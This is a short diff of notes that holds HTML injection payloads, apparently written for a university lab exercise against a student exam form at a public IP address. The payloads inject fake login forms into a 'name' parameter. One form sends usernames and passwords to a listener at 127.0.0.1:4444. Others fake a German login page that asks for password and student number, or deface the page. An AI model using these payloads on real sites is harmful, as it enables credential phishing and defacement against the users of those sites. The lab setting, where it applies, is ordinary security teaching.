@@ -1,1 +1,19 @@
 http://localhost:3000/hello?name=<h3>Please enter your name and password:</h3> <form method="GET" action="http://127.0.0.1:4444/login"> Username: <input type="text" name="username"/><br/> Password: <input type="password" name="password"/><br/> <input type="submit" value="Login" /> </form> <!--
+
+
+https://www.youtube.com/watch?v=dQw4w9WgXcQ
+
+
+http://193.196.36.166:3000/exam-form.html?
+
+
+Insert in name 
+<h1>DOWNLOAD FREE RAM HERE!</h1><!--
+
+
+
+Funny: 
+Student, sie haben sich erfolgreich angemeldet!<br></p><p>Klicken Sie <a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ">hier</a>, um Ihre Daten zu ueberpruefen!</p><footer><hr><span>2021 by HsKA IWI</span></footer><!--
+
+Normal: 
+Student, geben Sie bitte die erforderliche Daten!<br></p><form method="GET" action="https://www.youtube.com/watch?v=dQw4w9WgXcQ"> Username: <input type="text" name="username"/><br><br> Password: <input type="password" name="password"/><br><br> Matrikelnr: <input type="text" name="matrikelnr" required/><br><br> <input type="submit" value="Anmeldung abschicken"/></form><br><footer><hr><span>2021 by HsKA IWI</span></footer><!--
